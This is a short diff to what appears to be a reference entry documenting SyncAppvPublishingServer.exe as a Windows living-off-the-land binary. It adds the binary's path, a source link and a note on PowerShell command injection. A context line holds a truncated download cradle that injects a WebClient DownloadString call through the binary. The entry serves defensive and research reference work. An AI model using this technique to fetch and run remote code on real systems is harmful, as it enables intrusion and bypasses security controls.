@@ -8,3 +8,21 @@ SyncAppvPublishingServer.exe "n;((New-Object Net.WebClient).DownloadString('http
 
 Acknowledgements:
 * Nick Landers - @monoxgas
+
+Code sample:
+* 
+
+Resources:
+* https://twitter.com/monoxgas/status/895045566090010624
+
+Full path:
+```
+C:\Windows\System32\SyncAppvPublishingServer.exe
+```
+
+Notes:
+Command injection into PowerShell
+Might have been fixed in newest version of Windows 10.
+
+
+ 
